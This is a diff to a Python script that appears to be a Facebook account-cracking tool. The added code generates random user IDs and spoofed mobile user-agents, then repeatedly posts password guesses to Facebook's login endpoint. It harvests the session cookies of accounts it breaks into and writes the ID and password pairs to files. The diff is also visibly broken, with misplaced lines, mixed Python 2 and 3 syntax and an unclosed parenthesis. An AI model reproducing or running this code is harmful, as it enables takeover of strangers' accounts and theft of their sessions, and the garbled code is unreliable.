@@ -5,9 +5,40 @@
 #Reserved2023
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
 os.system('rm -rf .txt')
-for n in range(10000):
 
-    nmbr = random.randint(1111111, 9999999)
+for xd in range(10000):
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugen.append(uaku2)
+
+def i():
+    user=[]
+    twf =[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    jalan(logo)
+    
+limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    os.system("clear")
+    print(logo)
+    passx = int(input("[*] Enter Password Limit : ")
+   
+ nmbr = random.randint(1111111, 9999999)
     
     sys.stdout = open('.txt', 'a')
 
@@ -14611,7 +14642,76 @@ def action():
 	p.map(main, id)
 	print 44*'-'
 	print '[✓] Process Has Been Completed ....'
-	print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
+	
+	def rcrack(uid,pwx,tl):
+    #print(user)
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            free_fb = session.get('https://free.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {"authority": 'free.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=1',
+            'cache-control': 'no-cache, no-store, must-revalidate',
+            "referer": 'https://t.facebook.com/',
+            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
+            "sec-ch-ua-mobile": '?1',
+            "sec-ch-ua-platform": "Windows",
+            "sec-fetch-dest": 'document',
+            "sec-fetch-mode": 'navigate',
+            "sec-fetch-site": 'same-origin',
+            "sec-fetch-user": '?0',
+            "pragma": 'no-cache',
+            "priority": 'u=0',
+            'cross-origin-resource-policy': 'cross-origin',
+            "upgrade-insecure-requests": '1',
+            "user-agent": pro}
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print('    \033[1;32m[ⓇDX-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                cek_apk(session,coki)
+                open('/sdcard/ⓇDX-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                print('    \33[1;30m[ⓇDX-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/ⓇDX-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                cps.append(cid)
+                break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write(' %s[ⓇDX-] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.flush()
+    except:
+        pass
+
+ud()
+	
+    print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
 	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
 	print """
 \033[1;91m     ♦♦♦———————————————————————————————♦♦♦
